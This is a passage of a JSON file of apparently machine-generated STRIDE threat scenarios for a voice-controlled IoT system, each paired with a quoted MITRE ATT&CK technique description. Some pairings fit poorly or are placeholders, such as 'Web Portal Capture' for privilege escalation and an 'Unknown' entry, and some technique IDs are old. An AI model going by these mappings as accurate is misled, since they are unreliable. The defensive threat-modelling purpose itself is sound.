                "description": "Adversaries may insert, delete, or manipulate data at rest in order to manipulate external outcomes or hide activity.(Citation: FireEye APT38 Oct 2018)(Citation: DOJ Lazarus Sony 2018) By manipulating stored data, adversaries may attempt to affect a business process, organizational understanding, and decision making. \n\nStored data could include a variety of file formats, such as Office files, databases, stored emails, and custom file formats. The type of modification and the impact it will have depends on the type of data as well as the goals and objectives of the adversary. For complex systems, an adversary would likely need special expertise and possibly access to specialized software related to the system that would typically be gained through a prolonged information gathering campaign in order to have the desired impact.",
                "id": "attack-pattern--0bf78622-e8d2-41da-a857-731472d61a92",
                "technique_id": "T1492"
            }
        },
        {
            "Threat Type": "Tampering",
            "Scenario": "An attacker modifies firmware on IoT devices to alter their behavior.",
            "Assumptions": [
                {
                    "Assumption": "The attacker can deploy firmware updates to the IoT device.",
                    "Role": "Attacker",
                    "Condition": "Exploited vulnerability allowing firmware update access."
                },
                {
                    "Assumption": "The IoT device does not verify the authenticity of firmware updates.",
                    "Role": "IoT Device",
                    "Condition": "Lack of cryptographic signatures or secure boot mechanisms."
                },
                {
                    "Assumption": "The attacker has sufficient technical knowledge to create malicious firmware.",
                    "Role": "Attacker",
                    "Condition": "Proficiency in embedded systems and firmware development."
                }
            ],
            "Potential Impact": "Long-term data integrity issues and potential physical harm from altered device behavior.",
            "MITRE ATT&CK Keywords": [
                "tampering",
                "firmware",
                "malicious updates",
                "IoT devices"
            ],
            "mitre_technique": {
                "name": "Component Firmware",
                "description": "Some adversaries may employ sophisticated means to compromise computer components and install malicious firmware that will execute adversary code outside of the operating system and main system firmware or BIOS. This technique may be similar to [System Firmware](https://attack.mitre.org/techniques/T1019) but conducted upon other system components that may not have the same capability or level of integrity checking. Malicious device firmware could provide both a persistent level of access to systems despite potential typical failures to maintain access and hard disk re-images, as well as a way to evade host software-based defenses and integrity checks.",
                "id": "attack-pattern--10d5f3b7-6be6-4da5-9a77-0f1e2bbfcc44",
                "technique_id": "T1109"
            }
        },
        {
            "Threat Type": "Repudiation",
            "Scenario": "A user or attacker sends voice commands, and later denies having executed specific actions.",
            "Assumptions": [
                {
                    "Assumption": "There is no secure logging of user commands and actions.",
                    "Role": "System",
                    "Condition": "Lack of comprehensive and tamper-proof logging mechanisms."
                },
                {
                    "Assumption": "Voice commands are not tied to a verified identity.",
                    "Role": "Voice Authentication",
                    "Condition": "Insufficient authentication and authorization techniques."
                },
                {
                    "Assumption": "The system lacks proper audit trails.",
                    "Role": "Application",
                    "Condition": "Absence of end-to-end logging of interactions and commands."
                }
            ],
            "Potential Impact": "Difficulty in dispute resolution and potential misuse of the system.",
            "MITRE ATT&CK Keywords": [
                "repudiation",
                "voice command logs",
                "audit trails",
                "authentication"
            ],
            "mitre_technique": {
                "name": "Clear Linux or Mac System Logs",
                "description": "Adversaries may clear system logs to hide evidence of an intrusion. macOS and Linux both keep track of system or user-initiated actions via system logs. The majority of native system logging is stored under the <code>/var/log/</code> directory. Subfolders in this directory categorize logs by their related functions, such as:(Citation: Linux Logs)\n\n* <code>/var/log/messages:</code>: General and system-related messages\n* <code>/var/log/secure</code> or <code>/var/log/auth.log</code>: Authentication logs\n* <code>/var/log/utmp</code> or <code>/var/log/wtmp</code>: Login records\n* <code>/var/log/kern.log</code>: Kernel logs\n* <code>/var/log/cron.log</code>: Crond logs\n* <code>/var/log/maillog</code>: Mail server logs\n* <code>/var/log/httpd/</code>: Web server access and error logs\n",
                "id": "attack-pattern--2bce5b30-7014-4a5d-ade7-12913fe6ac36",
                "technique_id": "T1070.002"
            }
        },
        {
            "Threat Type": "Repudiation",
            "Scenario": "An attacker triggers actions through the IoT controller and then denies their involvement.",
            "Assumptions": [
                {
                    "Assumption": "There are no tamper-proof logs capturing actions initiated by the IoT controller.",
                    "Role": "System",
                    "Condition": "Logs are easily alterable or not maintained."
                },
                {
                    "Assumption": "The IoT controller does not enforce action tracking and user verification.",
                    "Role": "IoT Controller",
                    "Condition": "Lack of action tracking tied to authenticated users."
                },
                {
                    "Assumption": "Adversarial actions are not independently verifiable.",
                    "Role": "System",
                    "Condition": "No mechanisms for secondary validation of commands and actions."
                }
            ],
            "Potential Impact": "Integrity issues with IoT actions and lack of accountability.",
            "MITRE ATT&CK Keywords": [
                "repudiation",
                "IoT controller",
                "action tracking",
                "audit logs"
            ],
            "mitre_technique": {
                "name": "Unknown",
                "description": "No description available",
                "id": "attack-pattern--00000000-0000-0000-0000-000000000000",
                "technique_id": "N/A"
            }
        },
        {
            "Threat Type": "Repudiation",
            "Scenario": "An attacker manipulates logs on the server-side application to cover their tracks.",
            "Assumptions": [
                {
                    "Assumption": "The attacker has elevated privileges on the server.",
                    "Role": "Attacker",
                    "Condition": "Privileges gained via exploits or compromised credentials."
                },
                {
                    "Assumption": "Server-side application does not use immutability mechanisms for logs.",
                    "Role": "Server",
                    "Condition": "Logs can be edited or deleted after creation."
                },
                {
                    "Assumption": "There is no real-time monitoring of log integrity.",
                    "Role": "Monitoring System",
                    "Condition": "System lacks continuous and tamper-proof log monitoring."
                }
            ],
            "Potential Impact": "Compromised integrity of audit logs and potential evasion of detection.",
            "MITRE ATT&CK Keywords": [
                "repudiation",
                "log manipulation",
                "server access",
                "audit logs"
            ],
            "mitre_technique": {
                "name": "Clear Linux or Mac System Logs",
                "description": "Adversaries may clear system logs to hide evidence of an intrusion. macOS and Linux both keep track of system or user-initiated actions via system logs. The majority of native system logging is stored under the <code>/var/log/</code> directory. Subfolders in this directory categorize logs by their related functions, such as:(Citation: Linux Logs)\n\n* <code>/var/log/messages:</code>: General and system-related messages\n* <code>/var/log/secure</code> or <code>/var/log/auth.log</code>: Authentication logs\n* <code>/var/log/utmp</code> or <code>/var/log/wtmp</code>: Login records\n* <code>/var/log/kern.log</code>: Kernel logs\n* <code>/var/log/cron.log</code>: Crond logs\n* <code>/var/log/maillog</code>: Mail server logs\n* <code>/var/log/httpd/</code>: Web server access and error logs\n",
                "id": "attack-pattern--2bce5b30-7014-4a5d-ade7-12913fe6ac36",
                "technique_id": "T1070.002"
            }
        },
        {
            "Threat Type": "Information Disclosure",
            "Scenario": "An attacker intercepts unencrypted communications between the client-side application and the server.",
            "Assumptions": [
                {
                    "Assumption": "The attacker can access the network traffic between the client and the server.",
                    "Role": "Attacker",
                    "Condition": "Position within the network or compromised network hardware."
                },
                {
                    "Assumption": "Communication is transmitted without encryption.",
                    "Role": "System",
                    "Condition": "Use of plaintext or weakly protected communication protocols."
                },
                {
                    "Assumption": "There is no network traffic monitoring for suspicious activities.",
                    "Role": "Monitoring System",
                    "Condition": "Lack of network intrusion detection systems."
                }
            ],
            "Potential Impact": "Unauthorized disclosure of sensitive user commands and responses.",
            "MITRE ATT&CK Keywords": [
                "information disclosure",
                "network traffic",
                "encryption",
                "interception"
            ],
            "mitre_technique": {
                "name": "Adversary-in-the-Middle",
                "description": "Adversaries may attempt to position themselves between two or more networked devices using an adversary-in-the-middle (AiTM) technique to support follow-on behaviors such as [Network Sniffing](https://attack.mitre.org/techniques/T1040), [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002), or replay attacks ([Exploitation for Credential Access](https://attack.mitre.org/techniques/T1212)). By abusing features of common networking protocols that can determine the flow of network traffic (e.g. ARP, DNS, LLMNR, etc.), adversaries may force a device to communicate through an adversary controlled system so they can collect information or perform additional actions.(Citation: Rapid7 MiTM Basics)\n\nFor example, adversaries may manipulate victim DNS settings to enable other malicious activities such as preventing/redirecting users from accessing legitimate sites and/or pushing additional malware.(Citation: ttint_rat)(Citation: dns_changer_trojans)(Citation: ad_blocker_with_miner) Adversaries may also manipulate DNS and leverage their position in order to intercept user credentials, including access tokens ([Steal Application Access Token](https://attack.mitre.org/techniques/T1528)) and session cookies ([Steal Web Session Cookie](https://attack.mitre.org/techniques/T1539)).(Citation: volexity_0day_sophos_FW)(Citation: Token tactics) [Downgrade Attack](https://attack.mitre.org/techniques/T1562/010)s can also be used to establish an AiTM position, such as by negotiating a less secure, deprecated, or weaker version of communication protocol (SSL/TLS) or encryption algorithm.(Citation: mitm_tls_downgrade_att)(Citation: taxonomy_downgrade_att_tls)(Citation: tlseminar_downgrade_att)\n\nAdversaries may also leverage the AiTM position to attempt to monitor and/or modify traffic, such as in [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002). Adversaries can setup a position similar to AiTM to prevent traffic from flowing to the appropriate destination, potentially to [Impair Defenses](https://attack.mitre.org/techniques/T1562) and/or in support of a [Network Denial of Service](https://attack.mitre.org/techniques/T1498).",
                "id": "attack-pattern--035bb001-ab69-4a0b-9f6c-2de8b09e1b9d",
                "technique_id": "T1557"
            }
        },
        {
            "Threat Type": "Information Disclosure",
            "Scenario": "An attacker gains unauthorized access to cloud services storing sensitive user data.",
            "Assumptions": [
                {
                    "Assumption": "The cloud service account is compromised.",
                    "Role": "Attacker",
                    "Condition": "Credential theft or insufficient cloud security measures."
                },
                {
                    "Assumption": "Stored data is not encrypted at rest.",
                    "Role": "Cloud Services",
                    "Condition": "Data stored in plaintext or weakly encrypted."
                },
                {
                    "Assumption": "Cloud access and data usage are not thoroughly monitored.",
                    "Role": "Monitoring System",
                    "Condition": "Lack of detailed access logs and anomaly detection."
                }
            ],
            "Potential Impact": "Disclosure of sensitive user interactions and potentially personal information.",
            "MITRE ATT&CK Keywords": [
                "information disclosure",
                "cloud services",
                "data breach",
                "unauthorized access"
            ],
            "mitre_technique": {
                "name": "Cloud Services",
                "description": "Adversaries may log into accessible cloud services within a compromised environment using [Valid Accounts](https://attack.mitre.org/techniques/T1078) that are synchronized with or federated to on-premises user identities. The adversary may then perform management actions or access cloud-hosted resources as the logged-on user. \n\nMany enterprises federate centrally managed user identities to cloud services, allowing users to login with their domain credentials in order to access the cloud control plane. Similarly, adversaries may connect to available cloud services through the web console or through the cloud command line interface (CLI) (e.g., [Cloud API](https://attack.mitre.org/techniques/T1059/009)), using commands such as <code>Connect-AZAccount</code> for Azure PowerShell, <code>Connect-MgGraph</code> for Microsoft Graph PowerShell, and <code>gcloud auth login</code> for the Google Cloud CLI.\n\nIn some cases, adversaries may be able to authenticate to these services via [Application Access Token](https://attack.mitre.org/techniques/T1550/001) instead of a username and password. ",
                "id": "attack-pattern--8861073d-d1b8-4941-82ce-dce621d398f0",
                "technique_id": "T1021.007"
            }
        },
        {
            "Threat Type": "Information Disclosure",
            "Scenario": "An attacker exploits vulnerabilities in the client-side application to exfiltrate data.",
            "Assumptions": [
                {
                    "Assumption": "The client-side application has exploitable vulnerabilities.",
                    "Role": "Attacker",
                    "Condition": "Presence of unchecked input fields, weak authentication."
                },
                {
                    "Assumption": "Sensitive data is accessible through the client interface.",
                    "Role": "Client-side Application",
                    "Condition": "Client retains or caches sensitive responses."
                },
                {
                    "Assumption": "Client-side data access is not adequately logged.",
                    "Role": "System",
                    "Condition": "Lack of fine-grained access logging and monitoring."
                }
            ],
            "Potential Impact": "Leakage of user commands and system responses.",
            "MITRE ATT&CK Keywords": [
                "information disclosure",
                "client application",
                "exfiltration",
                "vulnerability exploitation"
            ],
            "mitre_technique": {
                "name": "Data from Local System",
                "description": "Adversaries may search local system sources, such as file systems and configuration files or local databases, to find files of interest and sensitive data prior to Exfiltration.\n\nAdversaries may do this using a [Command and Scripting Interpreter](https://attack.mitre.org/techniques/T1059), such as [cmd](https://attack.mitre.org/software/S0106) as well as a [Network Device CLI](https://attack.mitre.org/techniques/T1059/008), which have functionality to interact with the file system to gather information.(Citation: show_run_config_cmd_cisco) Adversaries may also use [Automated Collection](https://attack.mitre.org/techniques/T1119) on the local system.\n",
                "id": "attack-pattern--3c4a2599-71ee-4405-ba1e-0e28414b4bc5",
                "technique_id": "T1005"
            }
        },
        {
            "Threat Type": "Denial of Service",
            "Scenario": "An attacker floods the system with excessive voice commands, overwhelming the server-side processing capacity.",
            "Assumptions": [
                {
                    "Assumption": "The system has insufficient rate limiting mechanisms.",
                    "Role": "System",
                    "Condition": "No limits on the number of requests processed simultaneously."
                },
                {
                    "Assumption": "Server-side resources are finite and can be exhausted.",
                    "Role": "Server-side Application",
                    "Condition": "Limited processing power and memory."
                },
                {
                    "Assumption": "There are no automated mitigations for traffic spikes.",
                    "Role": "System",
                    "Condition": "Lack of scaling or throttling mechanisms."
                }
            ],
            "Potential Impact": "Disruption of service and potential unavailability for legitimate users.",
            "MITRE ATT&CK Keywords": [
                "denial of service",
                "resource exhaustion",
                "server overload",
                "rate limiting"
            ],
            "mitre_technique": {
                "name": "Application Exhaustion Flood",
                "description": "Adversaries may target resource intensive features of applications to cause a denial of service (DoS), denying availability to those applications. For example, specific features in web applications may be highly resource intensive. Repeated requests to those features may be able to exhaust system resources and deny access to the application or the server itself.(Citation: Arbor AnnualDoSreport Jan 2018)",
                "id": "attack-pattern--18cffc21-3260-437e-80e4-4ab8bf2ba5e9",
                "technique_id": "T1499.003"
            }
        },
        {
            "Threat Type": "Denial of Service",
            "Scenario": "An attacker targets the IoT controller with malformed commands, causing it to crash or malfunction.",
            "Assumptions": [
                {
                    "Assumption": "The IoT controller cannot handle unexpected or malformed input gracefully.",
                    "Role": "IoT Controller",
                    "Condition": "Lack of robust input validation and error handling."
                },
                {
                    "Assumption": "The attacker can send commands to the IoT controller.",
                    "Role": "Attacker",
                    "Condition": "Compromised network or insider threat."
                },
                {
                    "Assumption": "There is no automatic recovery mechanism for the controller.",
                    "Role": "System",
                    "Condition": "Controller requires manual intervention to restore."
                }
            ],
            "Potential Impact": "Disruption of IoT device functionality and potential physical consequences.",
            "MITRE ATT&CK Keywords": [
                "denial of service",
                "IoT controller",
                "malformed input",
                "crash"
            ],
            "mitre_technique": {
                "name": "Application or System Exploitation",
                "description": "Adversaries may exploit software vulnerabilities that can cause an application or system to crash and deny availability to users. (Citation: Sucuri BIND9 August 2015) Some systems may automatically restart critical applications and services when crashes occur, but they can likely be re-exploited to cause a persistent denial of service (DoS) condition.\n\nAdversaries may exploit known or zero-day vulnerabilities to crash applications and/or systems, which may also lead to dependent applications and/or systems to be in a DoS condition. Crashed or restarted applications or systems may also have other effects such as [Data Destruction](https://attack.mitre.org/techniques/T1485), [Firmware Corruption](https://attack.mitre.org/techniques/T1495), [Service Stop](https://attack.mitre.org/techniques/T1489) etc. which may further cause a DoS condition and deny availability to critical information, applications and/or systems. ",
                "id": "attack-pattern--2bee5ffb-7a7a-4119-b1f2-158151b19ac0",
                "technique_id": "T1499.004"
            }
        },
        {
            "Threat Type": "Denial of Service",
            "Scenario": "An attacker uses a botnet to DDoS the cloud services, disrupting overall system operations.",
            "Assumptions": [
                {
                    "Assumption": "The attacker controls a botnet capable of generating substantial traffic.",
                    "Role": "Attacker",
                    "Condition": "Access to a large number of compromised devices."
                },
                {
                    "Assumption": "Cloud services do not have adequate DDoS protections in place.",
                    "Role": "Cloud Services",
                    "Condition": "Inadequate traffic filtering and rate limiting."
                },
                {
                    "Assumption": "The system relies heavily on the availability of cloud services.",
                    "Role": "System",
                    "Condition": "Critical operations are dependent on cloud availability."
                }
            ],
            "Potential Impact": "Widespread service disruption and availability loss.",
            "MITRE ATT&CK Keywords": [
                "denial of service",
                "DDoS",
                "botnet",
                "cloud services"
            ],
            "mitre_technique": {
                "name": "Direct Network Flood",
                "description": "Adversaries may attempt to cause a denial of service (DoS) by directly sending a high-volume of network traffic to a target. This DoS attack may also reduce the availability and functionality of the targeted system(s) and network. [Direct Network Flood](https://attack.mitre.org/techniques/T1498/001)s are when one or more systems are used to send a high-volume of network packets towards the targeted service's network. Almost any network protocol may be used for flooding. Stateless protocols such as UDP or ICMP are commonly used but stateful protocols such as TCP can be used as well.\n\nBotnets are commonly used to conduct network flooding attacks against networks and services. Large botnets can generate a significant amount of traffic from systems spread across the global Internet. Adversaries may have the resources to build out and control their own botnet infrastructure or may rent time on an existing botnet to conduct an attack. In some of the worst cases for distributed DoS (DDoS), so many systems are used to generate the flood that each one only needs to send out a small amount of traffic to produce enough volume to saturate the target network. In such circumstances, distinguishing DDoS traffic from legitimate clients becomes exceedingly difficult. Botnets have been used in some of the most high-profile DDoS flooding attacks, such as the 2012 series of incidents that targeted major US banks.(Citation: USNYAG IranianBotnet March 2016)",
                "id": "attack-pattern--0bda01d5-4c1d-4062-8ee2-6872334383c3",
                "technique_id": "T1498.001"
            }
        },
        {
            "Threat Type": "Elevation of Privilege",
            "Scenario": "An attacker exploits a vulnerability in the client-side application to gain administrative privileges.",
            "Assumptions": [
                {
                    "Assumption": "The client-side application has an exploitable security flaw.",
                    "Role": "Attacker",
                    "Condition": "Presence of unpatched vulnerabilities or poor coding practices."
                },
                {
                    "Assumption": "The application architecture allows privilege escalation.",
                    "Role": "System",
                    "Condition": "Improper access controls and privilege segregation."
                },
                {
                    "Assumption": "The attacker can deliver a payload to the client-side application.",
                    "Role": "Attacker",
                    "Condition": "Network access or social engineering."
                }
            ],
            "Potential Impact": "Control over application and data, leading to potential widespread system compromise.",
            "MITRE ATT&CK Keywords": [
                "elevation of privilege",
                "client-side application",
                "vulnerability exploitation",
                "administrative access"
            ],
            "mitre_technique": {
                "name": "Web Portal Capture",
                "description": "Adversaries may install code on externally facing portals, such as a VPN login page, to capture and transmit credentials of users who attempt to log into the service. For example, a compromised login page may log provided user credentials before logging the user in to the service.\n\nThis variation on input capture may be conducted post-compromise using legitimate administrative access as a backup measure to maintain network access through [External Remote Services](https://attack.mitre.org/techniques/T1133) and [Valid Accounts](https://attack.mitre.org/techniques/T1078) or as part of the initial compromise by exploitation of the externally facing web service.(Citation: Volexity Virtual Private Keylogging)",
                "id": "attack-pattern--69e5226d-05dc-4f15-95d7-44f5ed78d06e",
                "technique_id": "T1056.003"
            }
        },
        {
            "Threat Type": "Elevation of Privilege",
            "Scenario": "An attacker uses compromised credentials to escalate privileges within the server-side application.",
            "Assumptions": [
                {
                    "Assumption": "The attacker has obtained valid user credentials.",
                    "Role": "Attacker",
                    "Condition": "Credential theft via phishing or data breach."
                },
                {
                    "Assumption": "Server-side application does not enforce strong role-based access controls.",
                    "Role": "Server-side Application",
                    "Condition": "Inadequate access controls and least privilege enforcement."
                },
                {
                    "Assumption": "The system lacks detection mechanisms for privilege escalation attempts.",
                    "Role": "System",
                    "Condition": "No real-time monitoring or anomaly detection."
                }
            ],
            "Potential Impact": "Compromised system integrity and unauthorized access to critical functions.",
            "MITRE ATT&CK Keywords": [
                "elevation of privilege",
                "server-side application",
                "credential theft",
                "access control"
            ],
            "mitre_technique": {
                "name": "Valid Accounts",
                "description": "Adversaries may obtain and abuse credentials of existing accounts as a means of gaining Initial Access, Persistence, Privilege Escalation, or Defense Evasion. Compromised credentials may be used to bypass access controls placed on various resources on systems within the network and may even be used for persistent access to remote systems and externally available services, such as VPNs, Outlook Web Access, network devices, and remote desktop.(Citation: volexity_0day_sophos_FW) Compromised credentials may also grant an adversary increased privilege to specific systems or access to restricted areas of the network. Adversaries may choose not to use malware or tools in conjunction with the legitimate access those credentials provide to make it harder to detect their presence.\n\nIn some cases, adversaries may abuse inactive accounts: for example, those belonging to individuals who are no longer part of an organization. Using these accounts may allow the adversary to evade detection, as the original account user will not be present to identify any anomalous activity taking place on their account.(Citation: CISA MFA PrintNightmare)\n\nThe overlap of permissions for local, domain, and cloud accounts across a network of systems is of concern because the adversary may be able to pivot across accounts and systems to reach a high level of access (i.e., domain or enterprise administrator) to bypass access controls set within the enterprise.(Citation: TechNet Credential Theft)",
                "id": "attack-pattern--b17a1a56-e99c-403c-8948-561df0cffe81",
                "technique_id": "T1078"
            }
        },
        {
            "Threat Type": "Elevation of Privilege",
            "Scenario": "An attacker exploits a firmware vulnerability to gain root access to an IoT device.",
            "Assumptions": [
                {
                    "Assumption": "The IoT device uses outdated or vulnerable firmware.",
                    "Role": "IoT Device",
                    "Condition": "Firmware not regularly updated or configured securely."
                },
                {
                    "Assumption": "The attacker has the means to exploit the firmware vulnerability.",
                    "Role": "Attacker",
                    "Condition": "Technical skill and exploit tools available."
                },
                {
                    "Assumption": "Gained access is not logged or monitored adequately.",
                    "Role": "Monitoring System",
                    "Condition": "Lack of comprehensive monitoring and alerting."
                }
            ],
            "Potential Impact": "Full control over the IoT device, leading to potential system-wide compromises.",
            "MITRE ATT&CK Keywords": [
                "elevation of privilege",
                "IoT device",
                "firmware vulnerability",
                "root access"
            ],
            "mitre_technique": {
                "name": "Kernel Modules and Extensions",
                "description": "Loadable Kernel Modules (or LKMs) are pieces of code that can be loaded and unloaded into the kernel upon demand. They extend the functionality of the kernel without the need to reboot the system. For example, one type of module is the device driver, which allows the kernel to access hardware connected to the system. (Citation: Linux Kernel Programming)\u00a0When used maliciously, Loadable Kernel Modules (LKMs) can be a type of kernel-mode [Rootkit](https://attack.mitre.org/techniques/T1014) that run with the highest operating system privilege (Ring 0). (Citation: Linux Kernel Module Programming Guide)\u00a0Adversaries can use loadable kernel modules to covertly persist on a system and evade defenses. Examples have been found in the wild and there are some open source projects. (Citation: Volatility Phalanx2) (Citation: CrowdStrike Linux Rootkit) (Citation: GitHub Reptile) (Citation: GitHub Diamorphine)\n\nCommon features of LKM based rootkits include: hiding itself, selective hiding of files, processes and network activity, as well as log tampering, providing authenticated backdoors and enabling root access to non-privileged users. (Citation: iDefense Rootkit Overview)\n\nKernel extensions, also called kext, are used for macOS to load functionality onto a system similar to LKMs for Linux. They are loaded and unloaded through <code>kextload</code> and <code>kextunload</code> commands. Several examples have been found where this can be used. (Citation: RSAC 2015 San Francisco Patrick Wardle) (Citation: Synack Secure Kernel Extension Broken) Examples have been found in the wild. (Citation: Securelist Ventir)",
                "id": "attack-pattern--6be14413-578e-46c1-8304-310762b3ecd5",
                "technique_id": "T1215"
            }
        }
    ]
},
{
    "case_number": "1",
    "batch_number": "24",
    "threats": [
        {
            "Threat Type": "Spoofing",
            "Scenario": "An attacker tricks the microphone to capture a pre-recorded voice command, making it appear as if the command is from a legitimate user.",
            "Assumptions": [
                {
                    "Assumption": "The attacker has access to a recording of the legitimate user's voice.",
                    "Role": "Attacker",
                    "Condition": "The legitimate user\u2019s voice has been previously recorded and obtained by the attacker."
                },
                {
                    "Assumption": "The system does not have robust voice authentication measures.",
                    "Role": "System Designer",
                    "Condition": "The application lacks advanced voice recognition technology to differentiate between live and recorded voices."
                },
                {
                    "Assumption": "The attacker can be physically near the microphone or utilize remote capabilities.",
                    "Role": "Attacker",
                    "Condition": "The microphone can capture the transmitted voice commands from the attacker's device."
                }
            ],
            "Potential Impact": "Data confidentiality compromised by unauthorized access to voice commands.",
            "MITRE ATT&CK Keywords": [
                "spoofing",
                "voice commands",
                "Microphone",
                "unauthorized access"
            ],
            "mitre_technique": {
                "name": "Audio Capture",
                "description": "An adversary can leverage a computer's peripheral devices (e.g., microphones and webcams) or applications (e.g., voice and video call services) to capture audio recordings for the purpose of listening into sensitive conversations to gather information.(Citation: ESET Attor Oct 2019)\n\nMalware or scripts may be used to interact with the devices through an available API provided by the operating system or an application to capture audio. Audio files may be written to disk and exfiltrated later.",
                "id": "attack-pattern--1035cdf2-3e5f-446f-a7a7-e8f6d7925967",
                "technique_id": "T1123"
            }
        },
        {
            "Threat Type": "Spoofing",
            "Scenario": "An attacker impersonates the IoT controller to send false control commands to IoT devices.",
            "Assumptions": [
                {
                    "Assumption": "The attacker has knowledge of the communication protocol between the client-side application and IoT controller.",
                    "Role": "Attacker",
                    "Condition": "The communication protocol has been reverse-engineered or otherwise exposed."
                },
                {
                    "Assumption": "Network traffic between components is not securely authenticated.",
                    "Role": "System Designer",
                    "Condition": "The application does not implement robust authentication mechanisms for IoT communications."
                },
                {
                    "Assumption": "The attacker has network access where the IoT devices or controller reside.",
                    "Role": "Attacker",
                    "Condition": "The IoT network is compromised or insufficiently secured."
                }
            ],
            "Potential Impact": "System integrity and availability violated by unauthorized device control.",
            "MITRE ATT&CK Keywords": [
                "spoofing",
                "impersonation",
                "IoT controller",
                "unauthorized commands"
            ],
            "mitre_technique": {
                "name": "Protocol Impersonation",
                "description": "Adversaries may impersonate legitimate protocols or web service traffic to disguise command and control activity and thwart analysis efforts. By impersonating legitimate protocols or web services, adversaries can make their command and control traffic blend in with legitimate network traffic.  \n\nAdversaries may impersonate a fake SSL/TLS handshake to make it look like subsequent traffic is SSL/TLS encrypted, potentially interfering with some security tooling, or to make the traffic look like it is related with a trusted entity. ",
                "id": "attack-pattern--c325b232-d5bc-4dde-a3ec-71f3db9e8adc",
                "technique_id": "T1001.003"
            }
        },
        {
            "Threat Type": "Spoofing",
            "Scenario": "An attacker impersonates a legitimate cloud service to capture and manipulate data traffic.",
            "Assumptions": [
                {
                    "Assumption": "The attacker has access to network paths between the application and cloud services.",
                    "Role": "Attacker",
                    "Condition": "Network paths are insufficiently secured or monitored."
                },
                {
                    "Assumption": "The application does not use strong SSL/TLS certificates for cloud communication.",
                    "Role": "System Designer",
                    "Condition": "The application lacks robust encryption for data in transit."
                },
                {
                    "Assumption": "The attacker can create a convincingly similar cloud service entity.",
                    "Role": "Attacker",
                    "Condition": "The attacker can spoof DNS or create similar-looking URLs."
                }
            ],
            "Potential Impact": "Data integrity and confidentiality compromised by unauthorized data access and manipulation.",
            "MITRE ATT&CK Keywords": [
                "spoofing",
                "cloud services",
                "data traffic",
                "Man-in-the-Middle"
            ],
            "mitre_technique": {
                "name": "DHCP Spoofing",
                "description": "Adversaries may redirect network traffic to adversary-owned systems by spoofing Dynamic Host Configuration Protocol (DHCP) traffic and acting as a malicious DHCP server on the victim network. By achieving the adversary-in-the-middle (AiTM) position, adversaries may collect network communications, including passed credentials, especially those sent over insecure, unencrypted protocols. This may also enable follow-on behaviors such as [Network Sniffing](https://attack.mitre.org/techniques/T1040) or [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002).\n\nDHCP is based on a client-server model and has two functionalities: a protocol for providing network configuration settings from a DHCP server to a client and a mechanism for allocating network addresses to clients.(Citation: rfc2131) The typical server-client interaction is as follows: \n\n1. The client broadcasts a `DISCOVER` message.\n\n2. The server responds with an `OFFER` message, which includes an available network address. \n\n3. The client broadcasts a `REQUEST` message, which includes the network address offered. \n\n4. The server acknowledges with an `ACK` message and the client receives the network configuration parameters.\n\nAdversaries may spoof as a rogue DHCP server on the victim network, from which legitimate hosts may receive malicious network configurations. For example, malware can act as a DHCP server and provide adversary-owned DNS servers to the victimized computers.(Citation: new_rogue_DHCP_serv_malware)(Citation: w32.tidserv.g) Through the malicious network configurations, an adversary may achieve the AiTM position, route client traffic through adversary-controlled systems, and collect information from the client network.\n\nDHCPv6 clients can receive network configuration information without being assigned an IP address by sending a <code>INFORMATION-REQUEST (code 11)</code> message to the <code>All_DHCP_Relay_Agents_and_Servers</code> multicast address.(Citation: rfc3315) Adversaries may use their rogue DHCP server to respond to this request message with malicious network configurations.\n\nRather than establishing an AiTM position, adversaries may also abuse DHCP spoofing to perform a DHCP exhaustion attack (i.e, [Service Exhaustion Flood](https://attack.mitre.org/techniques/T1499/002)) by generating many broadcast DISCOVER messages to exhaust a network\u2019s DHCP allocation pool. ",
                "id": "attack-pattern--59ff91cd-1430-4075-8563-e6f15f4f9ff5",
                "technique_id": "T1557.003"
            }
        },
        {
            "Threat Type": "Tampering",
            "Scenario": "An attacker alters signal data sent from the client-side application to the server.",
            "Assumptions": [
                {
                    "Assumption": "The attacker has access to the network communication between the client and server.",
                    "Role": "Attacker",
                    "Condition": "Network security is weak or non-existent."
                },
                {
                    "Assumption": "The application lacks data integrity checks.",
                    "Role": "System Designer",
                    "Condition": "The client-server communication does not employ hash validation or digital signatures."
                },
                {
                    "Assumption": "The attacker can modify the data in transit stealthily.",
                    "Role": "Attacker",
                    "Condition": "Network monitoring and intrusion detection are inadequate."
                }
            ],
            "Potential Impact": "Data integrity compromised, leading to incorrect processing or actions.",
            "MITRE ATT&CK Keywords": [
                "tampering",
                "data integrity",
                "client-server communication",
                "network manipulation"
            ],
            "mitre_technique": {
                "name": "Content Injection",
                "description": "Adversaries may gain access and continuously communicate with victims by injecting malicious content into systems through online network traffic. Rather than luring victims to malicious payloads hosted on a compromised website (i.e., [Drive-by Target](https://attack.mitre.org/techniques/T1608/004) followed by [Drive-by Compromise](https://attack.mitre.org/techniques/T1189)), adversaries may initially access victims through compromised data-transfer channels where they can manipulate traffic and/or inject their own content. These compromised online network channels may also be used to deliver additional payloads (i.e., [Ingress Tool Transfer](https://attack.mitre.org/techniques/T1105)) and other data to already compromised systems.(Citation: ESET MoustachedBouncer)\n\nAdversaries may inject content to victim systems in various ways, including:\n\n* From the middle, where the adversary is in-between legitimate online client-server communications (**Note:** this is similar but distinct from [Adversary-in-the-Middle](https://attack.mitre.org/techniques/T1557), which describes AiTM activity solely within an enterprise environment) (Citation: Kaspersky Encyclopedia MiTM)\n* From the side, where malicious content is injected and races to the client as a fake response to requests of a legitimate online server (Citation: Kaspersky ManOnTheSide)\n\nContent injection is often the result of compromised upstream communication channels, for example at the level of an internet service provider (ISP) as is the case with \"lawful interception.\"(Citation: Kaspersky ManOnTheSide)(Citation: ESET MoustachedBouncer)(Citation: EFF China GitHub Attack)",
                "id": "attack-pattern--43c9bc06-715b-42db-972f-52d25c09a20c",
                "technique_id": "T1659"
            }
        },
        {
            "Threat Type": "Tampering",
            "Scenario": "An attacker alters firmware of the IoT devices, executing unauthorized actions.",
            "Assumptions": [
                {
                    "Assumption": "The attacker has physical or network access to the IoT devices.",
                    "Role": "Attacker",
                    "Condition": "IoT device physical security or network access control is lacking."
                },
                {
                    "Assumption": "IoT devices do not employ secure boot mechanisms.",
                    "Role": "System Designer",
                    "Condition": "The firmware can be easily altered without detection."
                },
                {
                    "Assumption": "There is no regular integrity check for firmware updates.",
                    "Role": "System Administrator",
                    "Condition": "Firmware updates are not validated or monitored regularly."
                }
            ],
            "Potential Impact": "System integrity compromised, allowing unauthorized actions by IoT devices.",
